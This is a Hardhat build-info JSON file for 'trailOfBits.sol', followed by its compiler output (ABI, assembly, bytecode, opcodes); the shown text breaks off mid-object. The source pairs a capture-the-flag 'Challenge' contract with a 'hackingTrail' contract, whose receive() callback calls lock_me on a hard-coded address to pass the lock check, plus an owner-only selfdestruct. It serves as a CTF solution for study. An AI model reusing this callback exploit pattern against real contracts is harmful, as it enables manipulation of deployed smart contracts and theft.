{
	"id": "83a8a50700777c078e536c39fa940b5e",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.10",
	"solcLongVersion": "0.8.10+commit.fc410830",
	"input": {
		"language": "Solidity",
		"sources": {
			"trailOfBits.sol": {
				"content": "pragma solidity 0.8.10;\r\n\r\n// The goal of this challenge is to be able to sign offchain a message\r\n// with an address stored in winners.\r\ninterface IChallenge{\r\n    function exploit_me(address winner) external;\r\n    function lock_me() external;\r\n}\r\n\r\ncontract Challenge{\r\n\r\n    address[] public winners;\r\n    bool lock;\r\n\r\n    function exploit_me(address winner) public{\r\n        lock = false;\r\n\r\n        msg.sender.call(\"\");\r\n\r\n        require(lock);\r\n        winners.push(winner);\r\n    }\r\n\r\n    function lock_me() public{\r\n        lock = true;\r\n    }\r\n}\r\n\r\ncontract hackingTrail {\r\n\r\n    address private constant challengeAddr = 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E;\r\n\r\n    modifier onlyRoki {\r\n        require(msg.sender == address(0x798349E06c67272465123B91bd88C5d19b8c7878), \"lol how did you even find this?\");\r\n        _;\r\n    }\r\n\r\n    function hackTrail() external onlyRoki {\r\n        IChallenge challenge = IChallenge(challengeAddr);\r\n        challenge.lock_me();\r\n        selfdestruct(payable(0x798349E06c67272465123B91bd88C5d19b8c7878));\r\n    }\r\n\r\n    receive() external payable {\r\n        assembly {\r\n            mstore(0, 0x4c228cc7)\r\n            let check := call(gas(),challengeAddr,0,0,4,0,0)\r\n            if eq(check, 0) {\r\n                revert(0, returndatasize())\r\n            }\r\n        }\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"trailOfBits.sol": {
				"Challenge": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "winner",
									"type": "address"
								}
							],
							"name": "exploit_me",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "lock_me",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "winners",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"trailOfBits.sol\":251:555  contract Challenge{... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"trailOfBits.sol\":251:555  contract Challenge{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x4c228cc7\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x548853a0\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xa2fb1175\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"trailOfBits.sol\":497:552  function lock_me() public{... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n        /* \"trailOfBits.sol\":327:489  function exploit_me(address winner) public{... */\n    tag_4:\n      tag_8\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      tag_11\n      jump\t// in\n    tag_8:\n      stop\n        /* \"trailOfBits.sol\":278:302  address[] public winners */\n    tag_5:\n      tag_12\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      tag_15\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"trailOfBits.sol\":497:552  function lock_me() public{... */\n    tag_7:\n        /* \"trailOfBits.sol\":540:544  true */\n      0x01\n        /* \"trailOfBits.sol\":533:537  lock */\n      dup1\n      0x00\n        /* \"trailOfBits.sol\":533:544  lock = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"trailOfBits.sol\":497:552  function lock_me() public{... */\n      jump\t// out\n        /* \"trailOfBits.sol\":327:489  function exploit_me(address winner) public{... */\n    tag_11:\n        /* \"trailOfBits.sol\":387:392  false */\n      0x00\n        /* \"trailOfBits.sol\":380:384  lock */\n      0x01\n      0x00\n        /* \"trailOfBits.sol\":380:392  lock = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"trailOfBits.sol\":405:415  msg.sender */\n      caller\n        /* \"trailOfBits.sol\":405:420  msg.sender.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trailOfBits.sol\":405:424  msg.sender.call(\"\") */\n      mload(0x40)\n      tag_20\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_24\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_23)\n    tag_24:\n      0x60\n      swap2\n      pop\n    tag_23:\n      pop\n      pop\n      pop\n        /* \"trailOfBits.sol\":445:449  lock */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"trailOfBits.sol\":437:450  require(lock) */\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n        /* \"trailOfBits.sol\":461:468  winners */\n      0x00\n        /* \"trailOfBits.sol\":474:480  winner */\n      dup2\n        /* \"trailOfBits.sol\":461:481  winners.push(winner) */\n      swap1\n      dup1\n      0x01\n      dup2\n      sload\n      add\n      dup1\n      dup3\n      sstore\n      dup1\n      swap2\n      pop\n      pop\n      0x01\n      swap1\n      sub\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      add\n      0x00\n      swap1\n      swap2\n      swap1\n      swap2\n      swap1\n      swap2\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"trailOfBits.sol\":327:489  function exploit_me(address winner) public{... */\n      pop\n      jump\t// out\n        /* \"trailOfBits.sol\":278:302  address[] public winners */\n    tag_15:\n      0x00\n      dup2\n      dup2\n      sload\n      dup2\n      lt\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      add\n      0x00\n      swap2\n      pop\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_30:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_32:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_33:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_49\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_32\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:690   */\n    tag_34:\n        /* \"#utility.yul\":641:665   */\n      tag_51\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":641:665   */\n      tag_33\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":631:666   */\n      eq\n        /* \"#utility.yul\":621:684   */\n      tag_52\n      jumpi\n        /* \"#utility.yul\":680:681   */\n      0x00\n        /* \"#utility.yul\":677:678   */\n      dup1\n        /* \"#utility.yul\":670:682   */\n      revert\n        /* \"#utility.yul\":621:684   */\n    tag_52:\n        /* \"#utility.yul\":568:690   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":696:835   */\n    tag_35:\n        /* \"#utility.yul\":742:747   */\n      0x00\n        /* \"#utility.yul\":780:786   */\n      dup2\n        /* \"#utility.yul\":767:787   */\n      calldataload\n        /* \"#utility.yul\":758:787   */\n      swap1\n      pop\n        /* \"#utility.yul\":796:829   */\n      tag_54\n        /* \"#utility.yul\":823:828   */\n      dup2\n        /* \"#utility.yul\":796:829   */\n      tag_34\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":696:835   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":841:1170   */\n    tag_10:\n        /* \"#utility.yul\":900:906   */\n      0x00\n        /* \"#utility.yul\":949:951   */\n      0x20\n        /* \"#utility.yul\":937:946   */\n      dup3\n        /* \"#utility.yul\":928:935   */\n      dup5\n        /* \"#utility.yul\":924:947   */\n      sub\n        /* \"#utility.yul\":920:952   */\n      slt\n        /* \"#utility.yul\":917:1036   */\n      iszero\n      tag_56\n      jumpi\n        /* \"#utility.yul\":955:1034   */\n      tag_57\n      tag_30\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":917:1036   */\n    tag_56:\n        /* \"#utility.yul\":1075:1076   */\n      0x00\n        /* \"#utility.yul\":1100:1153   */\n      tag_58\n        /* \"#utility.yul\":1145:1152   */\n      dup5\n        /* \"#utility.yul\":1136:1142   */\n      dup3\n        /* \"#utility.yul\":1125:1134   */\n      dup6\n        /* \"#utility.yul\":1121:1143   */\n      add\n        /* \"#utility.yul\":1100:1153   */\n      tag_35\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1090:1153   */\n      swap2\n      pop\n        /* \"#utility.yul\":1046:1163   */\n      pop\n        /* \"#utility.yul\":841:1170   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1176:1253   */\n    tag_36:\n        /* \"#utility.yul\":1213:1220   */\n      0x00\n        /* \"#utility.yul\":1242:1247   */\n      dup2\n        /* \"#utility.yul\":1231:1247   */\n      swap1\n      pop\n        /* \"#utility.yul\":1176:1253   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1259:1381   */\n    tag_37:\n        /* \"#utility.yul\":1332:1356   */\n      tag_61\n        /* \"#utility.yul\":1350:1355   */\n      dup2\n        /* \"#utility.yul\":1332:1356   */\n      tag_36\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1325:1330   */\n      dup2\n        /* \"#utility.yul\":1322:1357   */\n      eq\n        /* \"#utility.yul\":1312:1375   */\n      tag_62\n      jumpi\n        /* \"#utility.yul\":1371:1372   */\n      0x00\n        /* \"#utility.yul\":1368:1369   */\n      dup1\n        /* \"#utility.yul\":1361:1373   */\n      revert\n        /* \"#utility.yul\":1312:1375   */\n    tag_62:\n        /* \"#utility.yul\":1259:1381   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1387:1526   */\n    tag_38:\n        /* \"#utility.yul\":1433:1438   */\n      0x00\n        /* \"#utility.yul\":1471:1477   */\n      dup2\n        /* \"#utility.yul\":1458:1478   */\n      calldataload\n        /* \"#utility.yul\":1449:1478   */\n      swap1\n      pop\n        /* \"#utility.yul\":1487:1520   */\n      tag_64\n        /* \"#utility.yul\":1514:1519   */\n      dup2\n        /* \"#utility.yul\":1487:1520   */\n      tag_37\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1387:1526   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1532:1861   */\n    tag_14:\n        /* \"#utility.yul\":1591:1597   */\n      0x00\n        /* \"#utility.yul\":1640:1642   */\n      0x20\n        /* \"#utility.yul\":1628:1637   */\n      dup3\n        /* \"#utility.yul\":1619:1626   */\n      dup5\n        /* \"#utility.yul\":1615:1638   */\n      sub\n        /* \"#utility.yul\":1611:1643   */\n      slt\n        /* \"#utility.yul\":1608:1727   */\n      iszero\n      tag_66\n      jumpi\n        /* \"#utility.yul\":1646:1725   */\n      tag_67\n      tag_30\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1608:1727   */\n    tag_66:\n        /* \"#utility.yul\":1766:1767   */\n      0x00\n        /* \"#utility.yul\":1791:1844   */\n      tag_68\n        /* \"#utility.yul\":1836:1843   */\n      dup5\n        /* \"#utility.yul\":1827:1833   */\n      dup3\n        /* \"#utility.yul\":1816:1825   */\n      dup6\n        /* \"#utility.yul\":1812:1834   */\n      add\n        /* \"#utility.yul\":1791:1844   */\n      tag_38\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1781:1844   */\n      swap2\n      pop\n        /* \"#utility.yul\":1737:1854   */\n      pop\n        /* \"#utility.yul\":1532:1861   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1867:1985   */\n    tag_39:\n        /* \"#utility.yul\":1954:1978   */\n      tag_70\n        /* \"#utility.yul\":1972:1977   */\n      dup2\n        /* \"#utility.yul\":1954:1978   */\n      tag_33\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1949:1952   */\n      dup3\n        /* \"#utility.yul\":1942:1979   */\n      mstore\n        /* \"#utility.yul\":1867:1985   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1991:2213   */\n    tag_17:\n        /* \"#utility.yul\":2084:2088   */\n      0x00\n        /* \"#utility.yul\":2122:2124   */\n      0x20\n        /* \"#utility.yul\":2111:2120   */\n      dup3\n        /* \"#utility.yul\":2107:2125   */\n      add\n        /* \"#utility.yul\":2099:2125   */\n      swap1\n      pop\n        /* \"#utility.yul\":2135:2206   */\n      tag_72\n        /* \"#utility.yul\":2203:2204   */\n      0x00\n        /* \"#utility.yul\":2192:2201   */\n      dup4\n        /* \"#utility.yul\":2188:2205   */\n      add\n        /* \"#utility.yul\":2179:2185   */\n      dup5\n        /* \"#utility.yul\":2135:2206   */\n      tag_39\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":1991:2213   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2219:2366   */\n    tag_40:\n        /* \"#utility.yul\":2320:2331   */\n      0x00\n        /* \"#utility.yul\":2357:2360   */\n      dup2\n        /* \"#utility.yul\":2342:2360   */\n      swap1\n      pop\n        /* \"#utility.yul\":2219:2366   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2372:2486   */\n    tag_41:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2492:2890   */\n    tag_42:\n        /* \"#utility.yul\":2651:2654   */\n      0x00\n        /* \"#utility.yul\":2672:2755   */\n      tag_76\n        /* \"#utility.yul\":2753:2754   */\n      0x00\n        /* \"#utility.yul\":2748:2751   */\n      dup4\n        /* \"#utility.yul\":2672:2755   */\n      tag_40\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2665:2755   */\n      swap2\n      pop\n        /* \"#utility.yul\":2764:2857   */\n      tag_77\n        /* \"#utility.yul\":2853:2856   */\n      dup3\n        /* \"#utility.yul\":2764:2857   */\n      tag_41\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":2882:2883   */\n      0x00\n        /* \"#utility.yul\":2877:2880   */\n      dup3\n        /* \"#utility.yul\":2873:2884   */\n      add\n        /* \"#utility.yul\":2866:2884   */\n      swap1\n      pop\n        /* \"#utility.yul\":2492:2890   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2896:3275   */\n    tag_21:\n        /* \"#utility.yul\":3080:3083   */\n      0x00\n        /* \"#utility.yul\":3102:3249   */\n      tag_79\n        /* \"#utility.yul\":3245:3248   */\n      dup3\n        /* \"#utility.yul\":3102:3249   */\n      tag_42\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":3095:3249   */\n      swap2\n      pop\n        /* \"#utility.yul\":3266:3269   */\n      dup2\n        /* \"#utility.yul\":3259:3269   */\n      swap1\n      pop\n        /* \"#utility.yul\":2896:3275   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a5a9bfedaf629452741d1ddf6aa5e674a25ca8aee4b6f7869feebfc925d8942864736f6c634300080a0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50610392806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80634c228cc714610046578063548853a014610050578063a2fb11751461006c575b600080fd5b61004e61009c565b005b61006a6004803603810190610065919061025c565b6100b8565b005b610086600480360381019061008191906102bf565b6101ba565b60405161009391906102fb565b60405180910390f35b60018060006101000a81548160ff021916908315150217905550565b6000600160006101000a81548160ff0219169083151502179055503373ffffffffffffffffffffffffffffffffffffffff166040516100f690610347565b6000604051808303816000865af19150503d8060008114610133576040519150601f19603f3d011682016040523d82523d6000602084013e610138565b606091505b505050600160009054906101000a900460ff1661015457600080fd5b6000819080600181540180825580915050600190039060005260206000200160009091909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600081815481106101ca57600080fd5b906000526020600020016000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610229826101fe565b9050919050565b6102398161021e565b811461024457600080fd5b50565b60008135905061025681610230565b92915050565b600060208284031215610272576102716101f9565b5b600061028084828501610247565b91505092915050565b6000819050919050565b61029c81610289565b81146102a757600080fd5b50565b6000813590506102b981610293565b92915050565b6000602082840312156102d5576102d46101f9565b5b60006102e3848285016102aa565b91505092915050565b6102f58161021e565b82525050565b600060208201905061031060008301846102ec565b92915050565b600081905092915050565b50565b6000610331600083610316565b915061033c82610321565b600082019050919050565b600061035282610324565b915081905091905056fea2646970667358221220a5a9bfedaf629452741d1ddf6aa5e674a25ca8aee4b6f7869feebfc925d8942864736f6c634300080a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x392 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4C228CC7 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x548853A0 EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xA2FB1175 EQ PUSH2 0x6C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x9C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x65 SWAP2 SWAP1 PUSH2 0x25C JUMP JUMPDEST PUSH2 0xB8 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x86 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x81 SWAP2 SWAP1 PUSH2 0x2BF JUMP JUMPDEST PUSH2 0x1BA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x93 SWAP2 SWAP1 PUSH2 0x2FB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH2 0xF6 SWAP1 PUSH2 0x347 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x133 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x138 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x154 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 DUP1 PUSH1 0x1 DUP2 SLOAD ADD DUP1 DUP3 SSTORE DUP1 SWAP2 POP POP PUSH1 0x1 SWAP1 SUB SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP1 SWAP2 SWAP1 SWAP2 SWAP1 SWAP2 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP2 SLOAD DUP2 LT PUSH2 0x1CA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x229 DUP3 PUSH2 0x1FE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x239 DUP2 PUSH2 0x21E JUMP JUMPDEST DUP2 EQ PUSH2 0x244 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x256 DUP2 PUSH2 0x230 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x272 JUMPI PUSH2 0x271 PUSH2 0x1F9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x280 DUP5 DUP3 DUP6 ADD PUSH2 0x247 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x29C DUP2 PUSH2 0x289 JUMP JUMPDEST DUP2 EQ PUSH2 0x2A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2B9 DUP2 PUSH2 0x293 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2D5 JUMPI PUSH2 0x2D4 PUSH2 0x1F9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2E3 DUP5 DUP3 DUP6 ADD PUSH2 0x2AA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2F5 DUP2 PUSH2 0x21E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x310 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2EC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x331 PUSH1 0x0 DUP4 PUSH2 0x316 JUMP JUMPDEST SWAP2 POP PUSH2 0x33C DUP3 PUSH2 0x321 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x352 DUP3 PUSH2 0x324 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA5 0xA9 0xBF 0xED 0xAF PUSH3 0x945274 SAR SAR 0xDF PUSH11 0xA5E674A25CA8AEE4B6F786 SWAP16 0xEE 0xBF 0xC9 0x25 0xD8 SWAP5 0x28 PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
							"sourceMap": "251:304:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@exploit_me_43": {
									"entryPoint": 184,
									"id": 43,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"@lock_me_51": {
									"entryPoint": 156,
									"id": 51,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@winners_13": {
									"entryPoint": 442,
									"id": 13,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_decode_t_address": {
									"entryPoint": 583,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_uint256": {
									"entryPoint": 682,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address": {
									"entryPoint": 604,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_uint256": {
									"entryPoint": 703,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 748,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 804,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 839,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 763,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
